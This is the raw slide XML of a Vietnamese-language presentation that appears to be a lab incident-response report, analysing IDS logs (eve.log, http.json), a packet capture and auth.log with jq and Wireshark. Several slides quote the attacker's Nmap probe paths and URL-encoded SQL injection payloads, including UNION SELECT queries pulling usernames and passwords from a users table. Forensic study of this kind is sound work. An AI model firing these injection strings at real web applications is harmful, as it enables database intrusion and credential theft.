              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="594" name="Google Shape;594;p53"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6079025" y="2556450"/>
            <a:ext cx="5726631" cy="379305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598"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="599" name="Google Shape;599;p54"/>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6.3.3. Chi tiết - Phân tích eve.log (IDS): </a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="600" name="Google Shape;600;p54"/>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1" name="Google Shape;601;p54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1328775"/>
            <a:ext cx="6096000" cy="323100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Phân tích http.json:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="602" name="Google Shape;602;p54" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666788" y="1299837"/>
            <a:ext cx="285750" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="603" name="Google Shape;603;p54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="261950" y="1818450"/>
            <a:ext cx="5577000" cy="738000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-301625" algn="just"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Thống kê URL bị gọi:</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jq -r '.http.url' http.json | sort | uniq -c | sort -nr</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="604" name="Google Shape;604;p54"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect l="5294"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="261950" y="2829550"/>
            <a:ext cx="5997226" cy="2989275"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="605" name="Google Shape;605;p54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6034125" y="1871725"/>
            <a:ext cx="5838300" cy="941700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="60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 Trích xuất chi tiết:</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="457200" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="60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cat http.json | jq '{time:.timestamp,src:.src_ip,url:.http.url,status:.http.status}'</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="606" name="Google Shape;606;p54"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect r="16002"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6375025" y="2829550"/>
            <a:ext cx="4684776" cy="37397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610"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="611" name="Google Shape;611;p55"/>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6.3.3. Chi tiết - Phân tích eve.log (IDS): </a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="612" name="Google Shape;612;p55"/>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3" name="Google Shape;613;p55"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1328775"/>
            <a:ext cx="6096000" cy="323100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Phân tích http.json:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="614" name="Google Shape;614;p55" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666788" y="1299837"/>
            <a:ext cx="285750" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="615" name="Google Shape;615;p55"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="2180600"/>
            <a:ext cx="10521300" cy="3466500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-301625" algn="just"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Giai đoạn dò quét bằng Nmap: "/sdk", "/nmaplowercheck1780007107", "/HNAP1", "/evox/about"</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="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=&gt; Đặc trưng của NSE</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-301625" algn="just"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SQL Injection: "/search.php?id=%27%20OR%20%271%27=%271" =&gt; ' OR '1'='1</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="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=&gt; Kiểm tra ứng dụng bị SQLi =&gt; Trả về 200 OK: Request thành công và không bị chặn bởi WAF hay ứng dụng</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-301625" algn="just"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Giai đoạn trích xuất thông tin database:</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="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"/search.php?id=%27%20UNION%20SELECT%201,database(),3,4%20--%20-"</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="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=&gt; Lấy tên Database hiện tại</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-301625" algn="just"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Truy xuất dữ liệu người dùng:</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="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"/search.php?id=%27%20UNION%20SELECT%201,username,password,4%20FROM%20users%20--%20-"</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="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=&gt; Attacker đã xác định được số cột, thực hiện UNION Injection, truy cập bảng users, cố gắn lấy username, password</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="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=&gt; Kết quả 200 OK: truy vấn đã được ứng dụng xử lý</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-301625" algn="just"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Giai đoạn truy cập hệ thống xác thực: ./login.php – 200: Đối tượng truy cập trang đăng nhập thành công và điều hướng sang trang quản trị. </a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>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619"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="620" name="Google Shape;620;p56"/>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6.3.4. Chi tiết</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> - Phân tíc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>h attack.pcap + auth.log: </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="621" name="Google Shape;621;p56"/>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2" name="Google Shape;622;p56"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="1416100"/>
            <a:ext cx="10521300" cy="738000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-301625" algn="just"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Xác định host nào đang giao tiếp với nhau:</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="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Sử dụng Wireshark: Statistics -&gt; Conversation -&gt; Xem Ipv4 và TCP</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>+ Tìm request http bất thường: </a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="623" name="Google Shape;623;p56"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect r="77892"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="941500" y="2727400"/>
            <a:ext cx="2078550" cy="2124075"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="624" name="Google Shape;624;p56"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3776000" y="2306500"/>
            <a:ext cx="8201025" cy="40481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628"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="629" name="Google Shape;629;p57"/>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6.3.4. Chi tiết - Phân tích attack.pcap + auth.log: </a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="630" name="Google Shape;630;p57"/>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1" name="Google Shape;631;p57"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="1670000"/>
            <a:ext cx="10521300" cy="2394000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-301625" algn="just"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Thống kê kết nối:</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Các kết nối chính diễn ra giữa 192.168.221.143 (máy attack) và 192.168.221.134 (máy victim), cổng 80 – dịch vụ web</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Nhiều phiên TCP ngắn, với mẫu dữ liệu lặp lại: gói tin từ attacker khoảng 132 bytes, phản hồi từ server khoảng 66 – 942 bytes.</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Tốc độ truyền thấp, thời gian ngắn =&gt; Dấu hiệu quét tự động</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Và có phiên kết nối giữa máy nạn nhân và máy tấn công =&gt; Có thể xác định các luồng dữ liệu được truyền đi giữa 2 thực thể này. Kết hợp với file auth.log =&gt; Có kết nối SSH từ máy 192.168.221.134 đến 192.168.221.143 =&gt; Đây có thể là phương thức mà file dump sql được gửi từ máy victim đến máy attack.</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
